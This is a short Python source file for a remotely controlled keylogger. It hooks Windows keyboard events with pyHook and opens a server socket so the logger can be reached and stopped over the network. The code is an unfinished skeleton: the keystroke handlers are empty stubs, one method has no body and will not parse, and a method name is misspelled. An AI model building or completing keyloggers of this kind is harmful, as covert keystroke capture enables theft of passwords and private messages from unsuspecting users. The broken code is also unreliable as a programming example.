from Universal import ServerSocketHandler
from Universal.constants import KeyLoggerConstants as consts
import pyHook, pythoncom
import sys

class _KeyLogger(object):
    def __init__(self, connection_socket):
        self._socket = connection_socket

    def _check_if_connection_terminated(self):
        try:
            self._socket.receive_data(print_progress=False)
            self._socket.teminate()
            sys.exit()
        except: # socket.error, didn't receive kill command
            return

    def _on_keyboard_event(self, event):
        pass

    def run(self):
        hooks_manager = pyHook.HookManager()
        hooks_manager.KeyDown = self._on_keyboard_event
        hooks_manager.HookKeyboard()
        pythoncom.PumpMessages()

class KliKeyLogger(object):
    def __init__(self, port):
        self.port = port
        self._socket = None

    def _raise_socket(self):
        self._socket = ServerSocketHandler(self.port)

    def _on_keyboard_event(self, event):
        pass

    def _run_keylogger(self):


    def mainloop(self):
        self._raise_socket()
        self._run_keylogger()

